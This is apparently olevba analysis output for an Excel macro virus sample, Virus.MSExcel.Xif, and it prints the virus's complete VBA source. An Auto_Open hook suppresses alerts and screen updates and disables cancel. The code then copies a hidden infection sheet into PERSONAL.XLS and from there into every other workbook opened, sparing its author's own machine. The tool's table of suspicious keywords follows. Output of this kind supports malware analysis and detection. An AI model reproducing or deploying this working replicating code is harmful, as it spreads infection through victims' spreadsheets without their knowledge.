olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Xif-ccd4f6e14ac2287f7e659d95519662cde922ac32
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Xcel.bas 
in file: Virus.MSExcel.Xif-ccd4f6e14ac2287f7e659d95519662cde922ac32 - OLE stream: '_VBA_PROJECT_CUR/VBA/Xcel'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnSheetActivate = "XcelInfektion"
End Sub

Sub XcelInfektion()
Attribute XcelInfektion.VB_ProcData.VB_Invoke_Func = " \n14"
AW = ActiveWorkbook.Name
TW = ThisWorkbook.Name
PX = "PERSONAL.XLS"
PPX = Application.StartupPath & "\" & PX
X = "Xcel"

On Error GoTo Xcelerator
If Application.UserName = "zWeiBLuM" And Application.OrganizationName = "[LGM]" Then GoTo Xcelerator
With Application
.ScreenUpdating = False
.Caption = "Micro$oft Excel"
.EnableCancelKey = xlDisabled
.DisplayAlerts = False
End With

XcelInf = 0
If TW <> PX Then
If Dir(PPX) = PX Then XcelInf = 1
If XcelInf = 1 Then
GoTo Xcelerator
Else
Workbooks.Add.SaveAs Filename:=PPX
Workbooks(TW).Sheets(X).Copy Before:=Workbooks(PX).Sheets(1)
Workbooks(PX).Sheets(X).Visible = False
Workbooks(PX).Save
Windows(PX).Visible = False
End If
Else
Windows(PX).Visible = False
For a = 1 To Workbooks(AW).Sheets.Count
If Workbooks(AW).Sheets(a).Name = X Then XcelInf = 1
Next
If XcelInf = 1 Then
GoTo Xcelerator
Else
Workbooks(PX).Sheets(X).Copy Before:=Workbooks(AW).Sheets(1)
Workbooks(AW).Sheets(X).Visible = False
Workbooks(AW).Save
Windows(PX).Visible = False
End If
End If
Workbooks(PX).Save
Application.ScreenUpdating = True
Application.DisplayAlerts = True
Call XcelAk
Xcelerator:
End Sub
Sub XcelAk()

End Sub
-------------------------------------------------------------------------------
VBA MACRO DieseArbeitsmappe.cls 
in file: Virus.MSExcel.Xif-ccd4f6e14ac2287f7e659d95519662cde922ac32 - OLE stream: '_VBA_PROJECT_CUR/VBA/DieseArbeitsmappe'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle1.cls 
in file: Virus.MSExcel.Xif-ccd4f6e14ac2287f7e659d95519662cde922ac32 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  Xce
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  XM97Xce
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

